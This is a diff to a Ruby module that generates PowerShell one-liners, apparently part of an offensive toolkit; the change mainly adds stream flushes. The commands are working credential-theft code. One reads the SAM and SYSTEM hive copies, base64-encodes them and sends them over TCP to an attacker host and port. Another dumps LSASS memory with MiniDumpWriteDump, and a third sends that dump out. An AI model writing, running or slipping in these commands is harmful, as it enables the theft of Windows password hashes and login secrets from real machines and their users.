@@ -7,13 +7,13 @@ module PowershellCommands
   def powershell_hash_dump(host,port)
     sam = 'c:\windows\temp\sam'
     sys = 'c:\windows\temp\sys'
-    powershell_command = %($sam_file=[System.Convert]::ToBase64String([io.file]::ReadAllBytes("#{sam}"));$socket = New-Object net.sockets.tcpclient('#{host}',#{port.to_i});$stream = $socket.GetStream();$writer = new-object System.IO.StreamWriter($stream);$writer.WriteLine("sam");$writer.flush();$writer.WriteLine($sam_file);$socket.close();$socket = New-Object net.sockets.tcpclient('#{host}',#{port.to_i});$sys_file=[System.Convert]::ToBase64String([io.file]::ReadAllBytes("#{sys}"));$stream = $socket.GetStream();$writer = new-object  System.IO.StreamWriter($stream);$writer.WriteLine("sys");$writer.flush();$writer.WriteLine($sys_file);$socket.close())
+    powershell_command = %($sam_file=[System.Convert]::ToBase64String([io.file]::ReadAllBytes("#{sam}"));$socket = New-Object net.sockets.tcpclient('#{host}',#{port.to_i});$stream = $socket.GetStream();$writer = new-object System.IO.StreamWriter($stream);$writer.WriteLine("sam");$writer.flush();$writer.WriteLine($sam_file);$writer.flush();$socket.close();$socket = New-Object net.sockets.tcpclient('#{host}',#{port.to_i});$sys_file=[System.Convert]::ToBase64String([io.file]::ReadAllBytes("#{sys}"));$stream = $socket.GetStream();$writer = new-object  System.IO.StreamWriter($stream);$writer.WriteLine("sys");$writer.flush();$writer.WriteLine($sys_file);$writer.flush();$socket.close())
     return powershell_command
   end
   def powershell_lsass_dump(host,port)
     lsass_file = 'c:\windows\temp\lsass.dmp'
     powershell_command1 = %($proc = ps lsass;$proc_handle = $proc.Handle;$proc_id = $proc.Id; $WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting');$WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic');$Flags = [Reflection.BindingFlags] 'NonPublic, Static';$MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags);$MiniDumpWithFullMemory = [UInt32] 2; $FileStream = New-Object IO.FileStream("#{lsass_file}", [IO.FileMode]::Create);$Result = $MiniDumpWriteDump.Invoke($null,@($proc_handle,$proc_id,$FileStream.SafeFileHandle,$MiniDumpWithFullMemory,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero));exit)
-     powershell_command2 = %($lsass_file=[System.Convert]::ToBase64String([io.file]::ReadAllBytes("#{lsass_file}"));$socket = New-Object net.sockets.tcpclient('#{host}',#{port.to_i});$stream = $socket.GetStream();$writer = new-object System.IO.StreamWriter($stream);$writer.WriteLine("lsass");$writer.flush();$writer.WriteLine($lsass_file);$writer.flush();$socket.close())
+    powershell_command2 = %($lsass_file=[System.Convert]::ToBase64String([io.file]::ReadAllBytes("#{lsass_file}"));$socket = New-Object net.sockets.tcpclient('#{host}',#{port.to_i});$stream = $socket.GetStream();$writer = new-object System.IO.StreamWriter($stream);$writer.WriteLine("lsass");$writer.flush();$writer.WriteLine($lsass_file);$writer.flush();$socket.close())
     return powershell_command1,powershell_command2
   end
   def powershell_wget_powershell(web_server,executable)
